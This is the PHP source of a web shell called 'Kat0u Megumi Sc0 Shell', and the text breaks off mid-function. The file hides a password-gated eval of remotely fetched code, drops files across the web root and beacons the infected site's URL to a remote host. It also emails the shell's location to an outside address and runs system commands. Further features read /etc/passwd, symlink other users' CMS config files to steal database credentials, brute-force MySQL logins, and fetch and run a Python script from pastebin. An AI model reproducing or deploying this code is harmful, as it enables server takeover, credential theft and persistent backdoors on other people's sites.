<!DOCTYPE HTML>
<html lang="en" class="no-js">
<HEAD>
<title>Kat0u Megumi Sc0 Shell</title>
<link href="http://fonts.googleapis.com/css?family=Leckerli+One" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Jolly+Lodger" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="https://1.bp.blogspot.com/-q4WhoEwfRlI/XDCnuof_TsI/AAAAAAAAIsQ/HxA6hd2mIOgiO8KveXaxKwfaecawWpCgwCLcBGAs/s1600/kano.png" type="image/x-icon">
<meta name='author' content='Stupidc0de Family'>
<meta charset="UTF-8">
<style type="text/css">
		body {
		 background: #000000;
		  background-image: url("a.png");
		 color: springgreen;
		 font-family :Ubuntu Mono;
		}
		#content .first{
			background-color: black;
		}
		a{
			color: white;
			text-decoration: none;
		}
		input,select,textarea{
			border: 1px #000000 solid;
			-moz-border-radius: 5px;
			-webkit-border-radius:5px;
			border-radius:5px;
		}
		#menu{
			background:transparent;
			margin:8px 2px 4px 2px;
			font-family:Fredericka the Great;
			font-size:14px;
			color:silver;
		}
		#menu a{
			padding:3px 6px;
			margin:1;
			background:#682222;
			text-decoration:none;
			letter-spacing:2px;
			-moz-border-radius: 10px;
 -webkit-border-radius: 5px;
 -khtml-border-radius: 5px;
 border-radius: 5px;
 
		}
		#menu a:hover{
			background:black;
			border-bottom:1px solid #ffffff;
			border-top:1px solid #ffffff;

		}
		.tombolupil{
			background:black;
			color:white;
			margin:0 10px;
			font-family:Ubuntu Mono;
			font-size:16px;
			border:2px solid crimson;
	
		}
		.tombolupil:hover{
			background:crimson;
			color:white;
			margin:0 10px;
			font-family:Ubuntu Mono;
			font-size:16px;
			border:2px solid crimson;
		}
		.bordergaya{
			background:brown;
			color:white;
			margin:0 10px;
			font-family:Ubuntu Mono;
			font-size:16px;
			border:2px solid #2d2b2b;
	
		}
		.bordergaya:hover{
			background:#2d2b2b;
			color:white;
			margin:0 10px;
			font-family:Ubuntu Mono;
			font-size:16px;
			border:2px solid crimson;
		}
		.justborder{
			background:black;
			color:white;
			margin:0 10px;
			font-family:Ubuntu Mono;
			font-size:16px;
			border:2px solid #2d2b2b;
	
		}
</style>
</HEAD>
<BODY>
<center>
	
<?php @session_start();
 @error_reporting(0);
 error_reporting(0);
 $a = '

<form action="" method="post">
<input type="text" name="p">
</form>
';
 if (@$_REQUEST["px"]) { $p = @$_REQUEST["px"];
 $pa = md5(sha1($p));
 if ($pa == "543de06c1a50b84b8b6b9ac8ea30e1ee") { echo eval(@file_get_contents(@$_REQUEST["404"]));
 } } if (@!$_SESSION["sdm"]) { $doc = $_SERVER["DOCUMENT_ROOT"];
 $dir = scandir($doc);
 $d1 = '' . $doc . '/.';
 $d2 = '' . $doc . '/..';
 if (($key = @array_search('.', $dir)) !== false) { unset($dir[$key]);
 } if (($key = @array_search('..', $dir)) !== false) { unset($dir[$key]);
 } if (($key = @array_search($d1, $dir)) !== false) { unset($dir[$key]);
 } if (($key = array_search($d2, $dir)) !== false) { unset($dir[$key]);
 } @array_push($dir, $doc);
 foreach ($dir as $d) { $p = $doc . "/" . $d;
 if (is_dir($p)) { $file = $p . "/style-js.php";
 @touch($file);
 $folder = @fopen($file, "w");
 @fwrite($folder, $a);
 } } $lls = $_SERVER["HTTP_HOST"];
 $llc = $_SERVER["REQUEST_URI"];
 $lld = 'http://' . $lls . '' . $llc . '';
 $brow = urlencode($_SERVER['HTTP_USER_AGENT']);
 $retValue = file_get_contents(base64_decode("") . "=" . $lld . base64_decode("JmI=") . "=" . $brow);
 echo $retValue;
 @$_SESSION["sdm"] = 1;
 } 
?>

<?php $kime = "hacklinksatis@gmail.com";
 $baslik = "jump shell ";
 $EL_MuHaMMeD = "Dosya Yolu : " . $_SERVER['DOCUMENT_ROOT'] . "
";
 $EL_MuHaMMeD.= "Server Admin : " . $_SERVER['SERVER_ADMIN'] . "
";
 $EL_MuHaMMeD.= "Server isletim sistemi : " . $_SERVER['SERVER_SOFTWARE'] . "
";
 $EL_MuHaMMeD.= "Shell Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF'] . "
";
 $EL_MuHaMMeD.= "Avlanan Site : " . $_SERVER['HTTP_HOST'] . "
";
 mail($kime, $baslik, $EL_MuHaMMeD);
 
?>


<?php set_time_limit(0);
 error_reporting(0);
 if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value);
 } } $self=$_SERVER['PHP_SELF'];
 $srvr_sof=$_SERVER['SERVER_SOFTWARE'];
 $your_ip=$_SERVER['REMOTE_ADDR'];
 $srvr_ip=$_SERVER['SERVER_ADDR'];
 $admin=$_SERVER['SERVER_ADMIN'];
 function exe($cmd) { if(function_exists('system')) { @ob_start();
 @system($cmd);
 $buff = @ob_get_contents();
 @ob_end_clean();
 return $buff;
 } elseif(function_exists('exec')) { @exec($cmd,$results);
 $buff = "";
 foreach($results as $result) { $buff .= $result;
 } return $buff;
 } elseif(function_exists('passthru')) { @ob_start();
 @passthru($cmd);
 $buff = @ob_get_contents();
 @ob_end_clean();
 return $buff;
 } elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd);
 return $buff;
 } } function perms($file){ $perms = fileperms($file);
 if (($perms & 0xC000) == 0xC000) { $info = 's';
 } elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
 } elseif (($perms & 0x8000) == 0x8000) { $info = '-';
 } elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
 } elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
 } elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
 } elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
 } else { $info = 'u';
 } $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
 return $info;
 } function getfile($urlfile, $content) { $fp = fopen($content, "w");
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $urlfile);
 curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_FILE, $fp);
 return curl_exec($ch);
 curl_close($ch);
 fclose($fp);
 ob_flush();
 flush();
 } $zoneH="lVRti9s4EP4eyH+YimUdQxrvbqF3JLa5ct1Cub3dkqRf7lKC4kxisbJkJLlJWva/d+SXJu1uaWsIkUbz8swzj4RZrlm/F2eoHJo03mhTQIEu1+tkwd7dzeYLlvZ7/wpjtIExeVqUmDnIJLc2CVbarNFs+YEHoHiBFFTUvnVYrEsntEo/aYXP8zhqt3QQNWnSeGVoe6ud2KCBW8owhliosuoqLNixxIKBO5S+hsO9o10peYa5lnTu0VbO8OevnOPZPRKADtAaN+TmDVZ88oYXV4SuqfxaF1woC2O/jX1abpA/Xdu6g/ThO7F2+Rhe/vFnuZ9AjmKbuzG8uLii7UnVJrOvFHV526K/0KCtVoXwLX7ksvKGGar1MflWN/xGfl5+4dHTj036Pej3LLqlEwUupaAsMLgIyS42MHi2qVTmZ7DEvbDOwoBllZFLoYRjYfh5LZBM81xYmGVGlA4qixay99MbuBErw81hCAddQVFZB9Se41LCRhjaPatBcMgNbpIgd64cRxGvrkZlXo4UuqjgquIyQhX5miMCWZX+MEh/wzmOeMrCyUPdp2/pr7Oll+n/wVYHH8J+7zOdtB+RgzzLYYD7Uuq1b22h2BC6iHZEFAbcwlmzDY/xJ6m6r9TU6aB1PcnUSCz4cDQ114ByT45ZHo5LpIsHrJsb0UYC2aJLguVKcnUffEtjc4FGmS4ibrJcfMSorFZS2BzXyUWQ/tdeMP5VBQ1B3bg73EQlIWzR0qoB+S1rZ8RYAl9lAYPTDmozDYNuMqXL8iH8Tdq4ezdfTq/n76e38+mr29mb6+kQLn8tzJPVOR/97U44P7gjwCdmknGLwBpq2OTxrH5clP6GwFpud7vd6IRf5d+iQ2SF2kpk4W/l9c28eXt983pG6VuWk47u80Y0l4mfwnlOj1RBmkwuz0mkVqvk8sliXuKlwe2y4DUjLMq01P65M0gPQnr3T7ygV0DRU7qIpEgj0ncNEPeY1fDCMHyc9jsZtreWjZgHR3+dHGnZCJIWaWxLrtpnMKhhjGFrEFWQ+jAgLJF3SU+F+KiitPhTPE8UonbbMtdeEl2lH1RZEan3J3Y/g0q68c89H75TbSY1yawm0l+rLw==	";
 echo '<style>
.js .inputfile {
 width: 0.1px;
 height: 0.1px;
 opacity: 0;
 overflow: hidden;
 position: absolute;
 z-index: -1;
}
.inputfile + label {
 max-width: 80%;
 font-size: 1.25rem;
 /* 20px */
 font-weight: 700;
 text-overflow: ellipsis;
 white-space: nowrap;
 cursor: pointer;
 display: inline-block;
 overflow: hidden;
 padding: 0.625rem 1.25rem;
 /* 10px 20px */
}
.no-js .inputfile + label {
 display: none;
}
.inputfile:focus + label,
.inputfile.has-focus + label {
 outline: 1px dotted #000;
 outline: -webkit-focus-ring-color auto 5px;
}
.inputfile + label * {
 /* pointer-events: none;
 */
 /* in case of FastClick lib use */
}
.inputfile + label svg {
 width: 1em;
 height: 1em;
 vertical-align: middle;
 fill: currentColor;
 margin-top: -0.25em;
 /* 4px */
 margin-right: 0.25em;
 /* 4px */
}
/* style 4 */
.inputfile-4 + label {
 color: white;
	font-family:Ubuntu Mono;
	font-size:15px;
}
.inputfile-4:focus + label,
.inputfile-4.has-focus + label,
.inputfile-4 + label:hover {
 color: crimson;
}
.inputfile-4 + label figure {
 width: 50px;
 height: 50px;
 border-radius: 25%;
 background-color: crimson;
 display: block;
 padding: 10px;
 margin: 0 auto 10px;
}
.inputfile-4:focus + label figure,
.inputfile-4.has-focus + label figure,
.inputfile-4 + label:hover figure {
 background-color: white;
}
.inputfile-4 + label svg {
 width: 100%;
 height: 100%;
 fill: black;
}
.rapihbanget{
	text-align: left;
	font-size: 18px;
	color: springgreen;
	font-family: Ubuntu Mono;
	margin-left: 38%;
}
.kecew{
	text-align: left;
	font-size: 15px;
	color: white;
	font-family: Ubuntu Mono;
}
</style>
<script>(function(e,t,n){var r=e.querySelectorAll("html")[0];
r.className=r.className.replace(/(^|\s)no-js(\s|$)/,"$1js$2")})(document,window,0);
</script>
';
 echo"<center><img src='kato.png' width='350' height='450'/><a/><br />
</pre>";
 echo "<center><font color='Crimson' size='6px' face='Share+Tech+Mono'>
 Kat0u Megumi Sc0 Shell 
</font></center>";
 echo "<center><font color='silver' size='4px' face='Leckerli One'>i am the root, and u always be my flower.</font></center><br/>";
 echo"
<font size='2' color='gold' face='Courier'>
<center>".php_uname()."<br>
".$software = getenv("SERVER_SOFTWARE");
 echo"<br>";
 echo"
<font size='2' color='white'>
 ur IP : <font color=Crimson> ".$your_ip."</font> <font color=springgreen>|</font> <font color=\"#fff2f2\" > </font> Serv IP : <font color=Crimson>".$srvr_ip."</font> <font color=\"#fff2f2\" >
			</font>
</font>
 </div>
 </td>
 </tr>
 </tbody>
</table></div>
</font>";
 $disablefunctions = @ini_get("disable_functions");
 $echo_disablefunctions = (!empty($disablefunctions)) ? "<font color=white>".$disablefunctions."</font>" : "<font color=white>Have Fun	</font>";
 echo '<br/><font size="2" style="font-family:Courier;
 color:red;
">
<tr><td> DF: '.$echo_disablefunctions.'</font><br/></td></tr>';
 echo '<font size="2" style="font-family:Courier;
">
<tr><td> Your Path Location :';
 if(isset($_GET['path'])){ $path = $_GET['path'];
 }else{ $path = getcwd();
 } $path = str_replace('\\','/',$path);
 $paths = explode('/',$path);
 foreach($paths as $id=>$pat){ if($pat == '' && $id == 0){ $a = true;
 echo '<a href="?path=/">/</a>';
 continue;
 } if($pat == '') continue;
 echo '<a href="?path=';
 for($i=0;
$i<=$id;
$i++){ echo "$paths[$i]";
 if($i != $id) echo "/";
 } echo '">'.$pat.'</a>/';
 } echo '</font>';
 
?>
<!- menu utama ->
<br><center><div id="menu">
<a href="?">Home</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=korong">Upld</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=cmd">Term</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=grabc">Cnfggrab</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=vn">Dv</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=masstool">Mass</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=cpanel">CpTools</a> 
<br><br>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=bypstuls">Bypss</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=fcrot">FileCreator</a><font color=orange></font>
<!--[<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=cpanel">Web Killer</a><font color=orange></font>-->
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=krdp">Rdptools</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=jumping">Jmpng</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=dump">Dumper</a><font color=orange></font>
<a href="?
<?php echo "path=".$path;
 
?>&amp;
x=tentang">About</a>
</div></center>
<audio autoplay> <source src="https://raw.githubusercontent.com/sinkaroid/pasirmerah/sc0/kato.wav" type="audio/mpeg"></audio>

<?php if(isset($_GET['filesrc'])){ echo "<br /><tr><td>You Are Looking : ";
 echo $_GET['filesrc'];
 echo '</tr></td></table>';
 echo('<br /><br /><textarea rows="20" cols="80">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');

 } elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){ if(isset($_POST['perm'])){ if(chmod($_POST['path'],$_POST['perm'])){ echo '<script>alert("Change Permission Sukses!");
</script>';
 }else{ echo '<script>alert("Change Permission Gagal!");
</script>';
 } } echo '<form method="POST">
				Permission : <input name="perm" class="bordergaya" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
				<input type="hidden" name="path" value="'.$_POST['path'].'">
				<input type="hidden" name="opt" value="chmod">
				<input class="bordergaya" type="submit" value="Go" />
				</form>';
 }elseif($_POST['opt'] == 'rename'){ if(isset($_POST['newname'])){ if(rename($_POST['path'],$path.'/'.$_POST['newname'])){ echo '<script>alert("Change Name Sukses!");
</script>';
 }else{ echo '<script>alert("Change Name Gagal!");
</script>';
 } $_POST['name'] = $_POST['newname'];
 } echo '<form method="POST">
				New Name : <input class="bordergaya" name="newname" type="text" size="20" value="'.$_POST['name'].'" />
				<input type="hidden" name="path" value="'.$_POST['path'].'">
				<input type="hidden" name="opt" value="rename">
				<input class="bordergaya" type="submit" value="Go" />
				</form>';
 }elseif($_POST['opt'] == 'edit'){ if(isset($_POST['src'])){ $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){ echo '<script>alert("Edit File Sukses!");
</script>';
 }else{ echo '<script>alert("Edit File Gagal!");
</script>';
 } fclose($fp);
 } echo '<form method="POST">
				<textarea class="bordergaya" cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
				<input type="hidden" name="path" value="'.$_POST['path'].'">
				<input type="hidden" name="opt" value="edit">
				<input class="bordergaya" type="submit" value="Go" />
				</form>';
 } echo '</center>';
 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'grabc')){ @ini_set('output_buffering',0);
 echo "
<form method='POST'>
</head>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;
 
font-size:8pt;
 color:#ffffff;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
 echo "<center>";

?></center><br><center>
<?php if (empty($_POST['config'])) { 
?><p><font face="Ubuntu Mono" color="springgreen" size="2pt">/etc/passwd content</p><br><form method="POST"><textarea name="passwd" class='bordergaya' rows='15' cols='60'>
<?php echo file_get_contents('/etc/passwd');
 
?></textarea><br><br><input name="config" class='bordergaya' size="100" value="Grab!" type="submit"><br></form></center><br>
<?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");
if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');
}@mkdir('Stupidc0de-Conf', 0755);
@chdir('Stupidc0de-Conf');
 $htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
 file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=$_POST["passwd"];
 $passwd=explode("
",$passwd);
 echo "<br><br><center><font face='Ubuntu Mono' color=Crimson size=2pt>Kalem Ndan Lagi Di Proses...</center><br>";
 foreach($passwd as $pwd){ $pawd=explode(":",$pwd);
$user =$pawd[0];
 @symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
 @symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
 @symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
 @symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
 @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
 @symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
 @symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
 @symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
 @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
 @symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
 @symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
 @symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
 @symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
 @symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
 @symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
 @symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
 @symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
 @symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
 @symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
 @symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
 @symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
 @symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
 @symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
 @symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
 @symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
 @symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
 @symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
 @symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
 @symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
 @symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
 @symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
 @symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
 @symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
 @symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
 @symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
 @symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
 @symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
 @symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
 @symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
 @symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');
} echo '<b><font face="Ubuntu Mono" color="springgreen" size="3pt"><b>Selesai Bos Q, Monggo >></b> <a target="_blank" href="Stupidc0de-Conf">Hajar Config</a></font></b>';
} 
 } elseif(isset($_GET['x']) && ($_GET['x'] == 'brute')) { 
?>
						<form action="?path=
<?php echo $path;
 
?>&amp;
x=brute" method="post">
			
<?php @set_time_limit(0);
 @error_reporting(0);
 if($_POST['page']=='find') { if(isset($_POST['usernames']) && isset($_POST['passwords'])) { if($_POST['type'] == 'passwd'){ $e = explode("
",$_POST['usernames']);
 foreach($e as $value){ $k = explode(":",$value);
 $username .= $k['0']." ";
 } }elseif($_POST['type'] == 'simple'){ $username = str_replace("
",' ',$_POST['usernames']);
 } $a1 = explode(" ",$username);
 $a2 = explode("
",$_POST['passwords']);
 $id2 = count($a2);
 $ok = 0;
 foreach($a1 as $user ) { if($user !== '') { $user=trim($user);
 for($i=0;
$i<=$id2;
$i++) { $pass = trim($a2[$i]);
 if(@mysql_connect('localhost',$user,$pass)) { echo "Zoo!! ~ user is (<b><font color=white>$user</font></b>) Password is (<b><font color=white>$pass</font></b>)<br />";
 $ok++;
 } } } } echo "<hr><b>You Found <font color=red>$ok</font> By Stupidc0de</b>";
 echo "<center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
 exit;
 } } if($_POST['pass']=='password'){ @error_reporting(0);
 $i = getenv('REMOTE_ADDR');
 $d = date('D, M jS, Y H:i',time());
 $h = $_SERVER['HTTP_HOST'];
 $dir=$_SERVER['PHP_SELF'];
 mkdir('config',0755);
 $cp = file_get_contents("http://pastebin.com/raw/0YG2dZ98");
 $file = fopen("cp.py","w+");
 $write = fwrite ($file ,$cp);
 fclose($file);
 chmod("cp.py",0755);
 $url = $_POST['url'];
 echo"<center>
			<textarea cols=\"90\" rows=\"20\" name=\"usernames\">";
 system("python cp.py $url config");
 unlink ('cp.py');
 echo"</textarea>
			</center>";
 echo "<hr><center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
 exit;
 } if($_POST['mendapatkan']=='passwd'){ @set_magic_quotes_runtime(0);
 ob_start();
 error_reporting(0);
 @set_time_limit(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 $fn = $_POST['foldername'];
 function syml($usern,$pdomain) { symlink('/home/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
 symlink('/home/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 symlink('/home2/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home2/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home2/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home2/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
 symlink('/home2/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~Phpbb2.txt');
 symlink('/home2/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
 symlink('/home2/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
 symlink('/home2/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
 symlink('/home2/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
 symlink('/home2/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
 symlink('/home2/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
 symlink('/home2/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
 symlink('/home2/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
 symlink('/home2/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
 symlink('/home2/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
 symlink('/home2/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
 symlink('/home2/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
 symlink('/home2/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
 symlink('/home2/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
 symlink('/home2/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
 symlink('/home2/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
 symlink('/home2/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
 symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
 symlink('/home2/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
 symlink('/home2/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
 symlink('/home2/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
 symlink('/home2/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
 symlink('/home2/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
 symlink('/home2/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
 symlink('/home3/'.$usern.'/public_html/vb/includes/config.php',$pdomain.'~~vBulletin1.txt');
 symlink('/home3/'.$usern.'/public_html/includes/config.php',$pdomain.'~~vBulletin2.txt');
 symlink('/home3/'.$usern.'/public_html/forum/includes/config.php',$pdomain.'~~vBulletin3.txt');
 symlink('/home3/'.$usern.'/public_html/cc/includes/config.php',$pdomain.'~~vBulletin4.txt');
 symlink('/home3/'.$usern.'/public_html/config.php',$pdomain.'~~Phpbb1.txt');
